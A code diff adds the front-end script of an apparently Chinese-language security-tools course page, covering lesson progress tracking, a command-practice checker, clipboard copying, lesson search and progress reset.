+  card.classList.toggle('done', cb.checked);
+  const l = findLesson(lid);
+  const pct = lessonPct(l);
+  const tag = $('#lpct'); if(tag) tag.textContent = '进度 ' + pct + '%';
+  renderNav();
+  if(lessonDone(l)) toast('这一节全部步骤完成 🎉');
+});
+
+function doTry(k){
+  const s = findLesson(k.split('#')[0]).steps[+k.split('#')[1]];
+  const cfg = s.try || {};
+  const wrap = document.querySelector(`.try[data-k="${k}"]`);
+  if(!wrap) return;
+  const val = (wrap.querySelector('input').value || '').trim().toLowerCase();
+  const msg = wrap.querySelector('[data-msg]');
+  msg.classList.add('show');
+  if(!val){
+    msg.className = 'trymsg show bad'; msg.textContent = '先写点什么——哪怕只写工具名，也是思考的开始。';
+    return;
+  }
+  const need = cfg.need || [];
+  const ok = need.every(n => val.includes(String(n).toLowerCase()));
+  if(ok){
+    msg.className = 'trymsg show good';
+    msg.textContent = '✓ ' + (cfg.ok || '对了。这条命令你已经会自己写出来了。');
+    const cb = document.querySelector(`[data-check="${k}"]`);
+    if(cb && !cb.checked){ cb.checked = true; cb.dispatchEvent(new Event('change', {bubbles:true})); }
+  }else{
+    msg.className = 'trymsg show bad';
+    msg.textContent = '再试一下：' + (cfg.hint || '检查一下工具名、参数、目标地址是否齐全。');
+  }
+}
+document.addEventListener('keydown', e=>{
+  if(e.key === 'Enter' && e.target.matches('.tryrow input')){
+    const k = e.target.closest('.try').getAttribute('data-k');
+    doTry(k);
+  }
+});
+
+function copyText(text){
+  if(navigator.clipboard && window.isSecureContext) return navigator.clipboard.writeText(text);
+  return new Promise((res, rej)=>{
+    const ta = document.createElement('textarea');
+    ta.value = text; ta.style.position='fixed'; ta.style.opacity='0';
+    document.body.appendChild(ta); ta.select();
+    try{ document.execCommand('copy'); res(); }catch(err){ rej(err); }
+    document.body.removeChild(ta);
+  });
+}
+
+/* ============ search ============ */
+const qEl = $('#q'), resEl = $('#results');
+qEl.addEventListener('input', ()=>{
+  const v = qEl.value.trim().toLowerCase();
+  if(!v){ resEl.classList.remove('show'); return; }
+  const hits = [];
+  allLessons().forEach(l=>{
+    const hay = [l.title, l.mod.name, (l.tags||[]).join(' '), l.goal.join(' '), JSON.stringify(l.steps)].join(' ').toLowerCase();
+    if(hay.includes(v)){
+      let sub = '';
+      l.steps.forEach(s=>{ if(!sub && ((s.cmd||'')+' '+s.title).toLowerCase().includes(v)) sub = (s.cmd||'').split('\n')[0].slice(0,52) || s.title; });
+      hits.push({l, sub});
+    }
+  });
+  resEl.innerHTML = hits.length
+    ? hits.slice(0,12).map(h=>`<div class="res-item" data-go="${h.l.id}">${esc(h.l.title)}<small>第 ${h.l.mod.no} 章 · ${esc(h.l.mod.short||h.l.mod.name)}${h.sub?' · '+esc(h.sub):''}</small></div>`).join('')
+    : '<div class="res-empty">没找到。试试工具名（nmap、burp、hashcat）或方向名（Web、取证、提权）。</div>';
+  resEl.classList.add('show');
+});
+qEl.addEventListener('focus', ()=>{ if(qEl.value.trim()) resEl.classList.add('show'); });
+document.addEventListener('click', e=>{ if(!e.target.closest('.search')) resEl.classList.remove('show'); });
+document.addEventListener('keydown', e=>{
+  if(e.key === '/' && document.activeElement !== qEl){ e.preventDefault(); qEl.focus(); }
+});
+resEl.addEventListener('click', ()=>{ resEl.classList.remove('show'); qEl.value=''; });
+
+/* ============ reset ============ */
+$('#btn-reset').addEventListener('click', ()=>{
+  if(confirm('确定清空所有学习进度吗？这个操作不能撤销。')){
+    state = {steps:{}, quiz:{}, tasks:{}, last:null}; saveState(); render(); toast('进度已重置');
+  }
+});
+
+/* ============ init ============ */
+if(!location.hash && state.last) location.hash = '#/lesson/' + encodeURIComponent(state.last);
+render();
+</script>
+</body>
+</html>
